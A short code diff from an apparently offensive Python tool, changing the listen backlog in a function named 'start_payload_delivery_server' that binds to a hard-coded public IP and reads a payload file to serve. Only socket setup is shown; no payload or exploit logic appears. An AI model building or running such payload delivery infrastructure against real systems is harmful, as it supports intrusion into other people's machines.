@@ -23,7 +23,7 @@ def start_payload_delivery_server(port=2004,ip="157.230.12.188"):
     global payload_name
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
     ss.bind((ip,port))
-    ss.listen()
+    ss.listen(10)
     payload_file = open(payload_name,'rb')
     payload = payload_file.read()
     payload_file.close()
